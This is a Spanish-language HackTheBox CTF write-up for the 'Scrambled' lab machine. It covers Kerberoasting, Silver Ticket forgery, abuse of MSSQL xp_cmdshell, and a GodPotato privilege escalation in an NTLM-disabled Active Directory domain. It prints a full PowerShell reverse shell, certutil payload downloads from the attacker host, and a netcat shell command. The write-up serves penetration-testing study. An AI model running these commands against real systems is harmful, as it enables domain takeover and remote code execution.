---
title: "HTB: Scrambled"
date: 2026-04-03 12:00:00 +0000
categories: [WriteUp, HackTheBox]
tags: [Active Directory, Windows, NTLM-Disabled, Kerberos, Kerberoasting, Silver-Ticket, MSSQL, xp_cmdshell, SeImpersonatePrivilege, GodPotato, Web-Enumeration]
image:
  path: /assets/img/scramble/Scrambled-HTB.png
  alt: HackTheBox Scrambled Machine
  width: 500
  height: 280
  class: sz

---

## Introducción

**Scrambled** es una máquina de **HackTheBox** enfocada en entornos de **Active Directory** con una restricción fundamental: la autenticación **NTLM está completamente deshabilitada**. 
Esto significa que no se puede usar usuario:contraseña directamente contra ningún servicio — todo debe realizarse mediante tickets **Kerberos**. El punto de partida es la enumeración del sitio web corporativo, donde se descubre el nombre de usuario `ksimpson` es una solicitud de reporte. La política de reset de contraseñas establece que la contraseña se resetea al nombre de usuario, lo que nos permite obtener un TGT para `ksimpson`. Con ese TGT se realiza **Kerberoasting** contra la cuenta de servicio `sqlsvc`, se crackea su hash y se calcula el hash NTLM para forjar un **Silver Ticket** como `Administrador` hacia el servicio MSSQL. Dentro del servidor SQL, `xp_cmdshell` permite ejecutar comandos del sistema, y el privilegio `SeImpersonatePrivilege` del proceso SQL se explota con **GodPotato** para escalar a `NT AUTHORITY\SYSTEM`.

---

## Reconocimiento

Se enviará una solicitud de **ICMP** (`ping`) para comprobar que la máquina objetivo se
encuentra activa y accesible.

```bash
ping -c 1 10.129.12.235
```

```
64 bytes from 10.129.12.235: icmp_seq=1 ttl=127 time=126 ms
```

### Escaneo de Puertos

Se ejecutará un escaneo de puertos con **Rustscan** para identificar los servicios expuestos
en la máquina objetivo.


```bash
rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -Pn -o nmapresult.txt
```

**Resultados relevantes:**

| Puerto | Estado | Servicio                        |
|--------|--------|---------------------------------|
| 53     | open   | Simple DNS Plus                 |
| 80     | open   | Microsoft IIS 10.0              |
| 88     | open   | Kerberos                        |
| 135    | open   | MS RPC                          |
| 139    | open   | NetBIOS                         |
| 389    | open   | LDAP (AD)                       |
| 445    | open   | SMB                             |
| 464    | open   | Kpasswd5                        |
| 636    | open   | LDAPS                           |
| 3268   | open   | LDAP Global Catalog             |
| 3269   | open   | LDAPS Global Catalog            |
| **4411**| open   | **ScrambleCorp Orders v1.0.3**  |
| 5985   | open   | WinRM (HTTP)                    |
| 9389   | open   | .NET Message Framing            |


### Análisis del escaneo

Los puertos habituales de **Active Directory** confirman que estamos ante un **Domain Controller** del entorno `scrm.local`.

- **Firma SMB obligatoria:** Descarta ataques de retransmisión NTLM.
- **Puerto 4411 — ScrambleCorp Orders:** Servicio propietario de la emrpesa. Responde con el banner `SCRAMBLECORP_ORDERS_V1.0.3`. Este será relevante más adelante.
- **ADCS detectado:** Los certificados SSL de LDAP muestran la CA interna `scrm-DC1-CA`.
- **Desface horario crítico:** Se detecta una diferencia de casi **8 horas** entre el servidor y nuestra máquina. Kerberos rechazará cualquier ticket con más de 5 minutos de diferencia. Es obligatorio sincronizar ante de cualquier ataque Kerberos:
```bash
  sudo ntpdate -u $IP
```

- **NTLM deshabilitado:** No confirmado por el escaneo directamente, pero la web lo anuncia explícitamente. Toda la cadena de ataque debe usar Kerberos.

--- 

## Enumeración inicial — Kerberos

Sin credenciales, usamos **Kerbrute** para verificar la existencia de usuarios validos en el dominio. El KDC responde de forma diferente ante usuarios válidos e inválidos:

```bash
kerbrute userenum --dc $IP -d scrm.local /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

```
[+] VALID USERNAME: administrator@scrm.local
Done! Tested 17 usernames (1 valid) in 0.236 seconds
```

Solo encontramos `administrator`, y la ausencia de `guest` indica en un entorno bien configurado en ese aspecto. El siguente paso a enumerar el servicio web en el puerto 80.

---

## Enumeración Web — Descubrimiento de usuario y política de contraseñas

### Web Fuzzing con Feroxbuster

```bash
feroxbuster -u http://10.129.12.235/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,js,txt -r
```

Páginas relevantes encontradas:

```
200  http://10.129.12.235/supportrequest.html
200  http://10.129.12.235/passwords.html
200  http://10.129.12.235/support.html
200  http://10.129.12.235/salesorders.html
200  http://10.129.12.235/newuser.html
```

### Información crítica encontrada en la web

**`/supportrequest.html`** — Contiene una solicutd de soporte donde se revela el username `ksimpson`:

![Support Request](/assets/img/scramble/support.png)

**`/passwords.html`** — Revela la política de contraseñas para resets:

![Passwords Policy](/assets/img/scramble/passwords.png)

> La página indica que cuando IT Support resetea una contraseña, la establece al **mismo nombre de usuario**. Esto es un error de seguridad critico — significa que si sabemos el username, conocemos la  contraseña  después de un reset.

**`/support.html`** — Informa que la autenticación NTLM está deshabilitada:

![NTLM Disabled](/assets/img/scramble/ntlm.png)

> Este mensaje confirma lo que sospechábamos: **NTLM está deshabilitado en todo el dominio**. No podemos usar herramientas que dependan de autenticación NTLM (SMB con pass, WMI, etc.). Toda autenticación debe hacerse con tickets Kerberos.

---


## Kerberoasting via Kerberos — Cuenta sqlsvc

### Obtención del TGT de ksimpson


Dado que la contraseña fue reseteada el nombre del usuario:

```bash
getTGT.py scrm.local/ksimpson:ksimpson -dc-ip $IP
```

```
[*] Saving ticket in ksimpson.ccache
```

```bash
export KRB5CCNAME=ksimpson.ccache
```


### Enumeración de SPNs del dominio

Con el TGT de `ksimpson` podemos consultar el LDAP del DC para buscar cuentas con SPNs:

```bash
GetUserSPNs.py -k -no-pass -dc-host dc1.scrm.local scrm.local/ksimpson
```

```
ServicePrincipalName          Name    PasswordLastSet

MSSQLSvc/dc1.scrm.local:1433  sqlsvc  2021-11-03 11:32:02
MSSQLSvc/dc1.scrm.local       sqlsvc  2021-11-03 11:32:02

```

La cuenta `sqlsvc` tiene SPNs registrados para el servicio **MSSQL**. Esto lo hace perfecta para **Kerberoasting**.

### ¿Qué es Kerberoasting y por qué funciona aquí?

Kerberoasting explota el protocolo Kerberos: cualquier usuario autenticado puede solicitar un **TGS (Ticket de Servicio)** para cualquier SPN del dominio. El KDC emite ese ticket cifrado con el **hash NTLM de la cuenta propietaria del SPN** — en este caso `sqlsvc` No se necesitan privilegios especiales para solicitar el ticket, y el DC no verifica si realmente va usar ese servicio.

Una vez obtenido el TGS, lo crackeamos offline con Hashcat. Si la contraseña de la cuenta
de servicio es débil, la obtenemos sin hacer ruido adicional en la red.

**¿Por qué funciona aquí si NTLM está deshabilitado?**

Kerberoasting no usa NTLM — usa Kerberos puro. La autenticación inicial con `ksimpson`
fue vía Kerberos (TGT), y la solicitud del TGS también es Kerberos. El hash que obtenemos
está cifrado con el hash NTLM de `sqlsvc`, pero el proceso de solicitud es 100% Kerberos.

```bash
GetUserSPNs.py -k -no-pass -dc-host dc1.scrm.local scrm.local/ksimpson -request
```

```
krb5tgs$23*sqlsvcSCRM.LOCALSCRM.LOCALSCRM.LOCALscrm.local/sqlsvc*$be75af96b6b9287a...<hash>
```
### Crackeo offline con Hashcat

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

```
krb5tgs$23
*sqlsvcSCRM.LOCALSCRM.LOCAL
SCRM.LOCAL...:Pegasus60
Status: Cracked
```

**Contraseña de sqlsvc:** `Pegasus60`

---

## Silver Ticket — Forjar un TGS como Administrator

### ¿Qué es un Silver Ticket y por qué lo necesitamos aquí?


Un **Silver Ticket** es un **TGS (Ticket de Servicio) completamente falso** forjado localmente sin contactar al KDC. Para forjarlo necesitamos:

1. El **hash NTLM** de la cuenta que tiene el SPN (en este caso `sqlsvc`).
2. El **SID del dominio**.
3. El **SPN** del servicio al que queremos acceder.
4. El nombre del usuario que queremos **impersonar**  (en este caso `Administrator`).

**¿Por qué es posible forjar un ticket sin el KDC?**

cuando el servidor SQL recibe un TGS, lo descifra usando su **propia clave** (el hash NTLM de `sqlsvc`). El servidor SQL **no contacta al KDC** para verificar el ticket — simplemente verifica que puede descifrarlo correctamente y que el PAC (Privilege Attribute Certificate) incluido es coherente. Como nosotros sabemos la clave de `sqlsvc`, podemos forjar el ticket completo — incluyendo el PAC que dice que somos `Administrator`.

**¿Por qué Silver Ticket en lugar de usar las credenciales directamente?**

Porque NTLM está deshabilitado. No podemos autenticarnos con `sqlsvc:Pegasus60` contra MSSQL via autenticación estándar. Pero sí podemos forjar un Silver Ticket Kerberos que el servidor SQL aceptará directamente sin contactar al DC.

**¿Cuál es la limitación de un Silver Ticket frente a un Golden Ticket?**

Un **Golden Ticket** usa la clave del `krbtgt` y puede acceder a **cualquier servicio** del dominio. Un **Silver Ticket** está limitado a **un servicio específico** (en este caso solo MSSQL en `dc1.scrm.local`). Sin embargo, para nuestro propósito es suficiente.

### 1. Calcular el hash NTLM de sqlsvc

Converti,ps la contraseña crackeada a hash NTLM. El hash NTLM es simplemente el hash MD4 de la contraseña en Unicode, y Impacket puede calcularlo directamente:

```bash
python3 -c "
from impacket.ntlm import compute_nthash;h = compute_nthash('Pegasus60');print(h.hex())"
```

```
b999a16500b87d17ec7f2e2a68778f05
```

### 2. Obtener el SID del dominio

Neceistamos el SID del dominio para construir el PAC del ticket. Usamos `lookupsid.py` con el TGT de `sqlsvc`:

```bash
getTGT.py scrm.local/sqlsvc:Pegasus60 -dc-ip $IP
```

```bash
export KRB5CCNAME=sqlsvc.ccache
```

```bash
lookupsid.py -k -no-pass 'SCRM.LOCAL/sqlsvc@dc1.scrm.local'
```

```
[*] Domain SID is: S-1-5-21-2743207045-1827831105-2542523200
```

### 3. Forjar el Silver Ticket


```bash
ticketer.py \
  -nthash b999a16500b87d17ec7f2e2a68778f05 \
  -domain-sid S-1-5-21-2743207045-1827831105-2542523200 \
  -domain SCRM.LOCAL \
  -spn MSSQLSvc/dc1.scrm.local:1433 \
  Administrator
```

```
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SCRM.LOCAL/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

```bash
export KRB5CCNAME=Administrator.ccache
```

> El Silver Ticket está forjado. Desde la perspectiva del servidor SQL, este ticket es completamente válido — está correctamente cifrado con la clave de `sqlsvc` y contiene un PAC que dice que somos `Administrator` del dominio.

---

## MSSQL — Acceso como Administrator

```bash
mssqlclient.py -k -no-pass dc1.scrm.local
```

```
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
SQL (SCRM\administrator  dbo@master)>
```

> Accedemos como `SCRM\administrator` com permisos de `dbo` (Database Owner). El silver Ticket funciona perfectamente — el servidor SQL nos reconoce como administrador del dominio.

### Habilitación de xp_cmdshell

**xp_cmdshell** es un procedimiento almacenado extendido que permite ejecutar comandos del sistema operativo directamente desde SQL Server. Está deshabilitado por defecto desde SQL Server 2005, pero como tenemos el rol de `sysadmin` (heredado de ser administrador del dominio en el contexto del SQL), podemos habilitarlo:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

```sql
EXEC xp_cmdshell 'whoami'
```

```
scrm\sqlsvc
```

> Los comandos del sistema se ejecutan con la identidad del **proceso SQL** (`sqlsvc`), no con la del usuario SQL que nos conectamos (`administrator`). En SQL Server, `xp_cmdshell` siempre corre bajo la cuenta del servicio SQL, independientemente del usuario que lo invoque. Pero `sqlsvc` tiene `SeImpersonatePrivilege` — nuestro vector de escalada.

### Reverse Shell via xp_cmdshell

```bash
nc -nvlp 4444
```

```sql
EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.116'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
```

```
Connection received on 10.129.12.235 52151
PS C:\Windows\system32>
```
### Flag de usuario

```powershell
type C:\Users\sqlsvc\Desktop\user.txt
<user_flag>
```


## Escalada de Privilegios — GodPotato via SeImpersonatePrivilege

### Análisis de privilegios


```powershell
whoami /priv
```

```
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

`SeImpersonatePrivilege` esta habilitado — el camino a SYSTEM está abierto.

### ¿Por qué SeImpersonatePrivilege + GodPotato = SYSTEM?

**`SeImpersonatePrivilege`** permite a un proceso usar el token de seguridad de un cliente que se conecta a él. Su propósito legítimo es que servicios como SQL Server puedan ejecutar operaciones con la identidad del usuario que hizo la consulta.

**La vulnerabilidad:** Si conseguimos que `NT AUTHORITY\SYSTEM` se conecte a una
**named pipe** que controlamos (aunque sea brevemente), podemos capturar su token y usarlo
para ejecutar procesos como SYSTEM.

**¿Cómo lo hace GodPotato específicamente?**

**GodPotato** abusa el protocolo **DCOM (Distributed Component Object Model)**. Cuando
activamos el objeto COM `IRemoteSCMActivator`, el servicio `RPCSS` que corre como SYSTEM
intenta conectarse a nuestra named pipe para completar la activación. GodPotato:

1. Crea una **named pipe** bajo nuestro control.
2. Llama a `IRemoteSCMActivator` para forzar que SYSTEM se conecte.
3. Cuando SYSTEM se conecta, usa `ImpersonateNamedPipeClient()` para capturar su token.
4. Con el token de SYSTEM, llama a `CreateProcessWithTokenW()` para ejecutar cualquier
   comando como SYSTEM.

**¿Por qué GodPotato y no JuicyPotato o PrintSpoofer?**

- **JuicyPotato** requiere un CLSID COM específico que no siempre está disponible en
  Windows Server 2019.
- **PrintSpoofer** abusa del servicio de cola de impresión, que puede estar deshabilitado.
- **GodPotato** usa `IRemoteSCMActivator` que está disponible en **todas** las versiones
  de Windows Server desde 2012 hasta 2022, sin depender de servicios específicos.

### Transferencia de herramientas

```bash
sudo python3 -m http.server 4000
```

```powershell
certutil -urlcache -split -f "http://10.10.14.116:4000/nc.exe" nc.exe
certutil -urlcache -split -f "http://10.10.14.116:4000/GodPotato-NET4.exe" gp.exe
```

> `certutil` con `-urlcache -split -f` es el método nativo de Windows para descargar
> archivos desde HTTP — equivalente a `wget` en Linux. Viene preinstalado en todas las
> versiones de Windows y raramente está bloqueado.

### Ejecución de GodPotato

```bash
nc -nvlp 443
```

```powershell
.\gp.exe -cmd "nc.exe 10.10.14.116 443 -e cmd.exe"
```

```
[+] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[+] Start Search System Token
[+] PID : 924 Token:0x396  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[+] Find System Token : True
[+] CurrentUser: NT AUTHORITY\SYSTEM
[+] process start with pid 4864

Connection received on 10.129.12.235 51367
Microsoft Windows [Version 10.0.17763.2989]
C:\users\Public> whoami
nt authority\system
```

### Flag de root

```powershell
type C:\Users\Administrator\Desktop\root.txt
<root_flag>
```

**¡Máquina comprometida con éxito!**


